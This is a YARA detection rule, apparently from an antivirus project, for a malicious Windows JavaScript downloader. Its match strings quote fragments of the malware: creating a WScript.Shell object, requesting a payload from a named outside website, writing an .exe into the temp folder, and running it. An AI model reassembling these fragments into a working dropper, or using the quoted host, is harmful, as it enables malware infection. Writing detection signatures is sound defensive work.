rule sig_20160329_be2062029f282fb692223efd51f7fcc5 {
  meta:
    description = "datamaliciousorder - file 20160329_be2062029f282fb692223efd51f7fcc5.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "3e04cdb99e861eece1718f5f76e4d5b3d3d9152753b9cea2150d2fb41492559e"

  strings:
    $s1  = "function P() {return ps[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"P832OusH4rwd.exe\";};" fullword ascii
    $s2  = "for (;;){WScript[Bs](d() * 11); if (or[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s3  = "var ps = function F() {return WScript[U](\"WScript.Shell\");}(), Et = 11;" fullword ascii
    $s4  = "function z(k, Rk){Bg = Bg * 1; return k - Rk;};" fullword ascii
    $s5  = "or[v](\"GET\", \"http://pasticceriabonci.it/m1psa\", false);" fullword ascii
    $s6  = "function yC(){return \"\" + hm;};" fullword ascii
    $s7  = "function l() {return ((nx == true) && (nx == Y)) ? 1 : Bg;};" fullword ascii
    $s8  = "function I(H){ps[\"Run\"](H, Bg, Bg);};" fullword ascii
    $s9  = "function G()" fullword ascii
    $s10 = "function d(){return 22;};" fullword ascii
    $s11 = "function xz(a) {var S = (1, 2, 3, 4, 5, a); return S;};" fullword ascii
    $s12 = "return z(Z, J);" fullword ascii
    $s13 = "var s0 = new this[\"Date\"]();" fullword ascii
    $s14 = " while (fR){" fullword ascii
    $s15 = "function Dl(){return U;};" fullword ascii
    $s16 = "Y = true; " fullword ascii
    $s17 = "var Y = false;" fullword ascii
    $s18 = "var l0 = false;" fullword ascii
    $s19 = "nx = true; " fullword ascii
    $s20 = "var nx = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}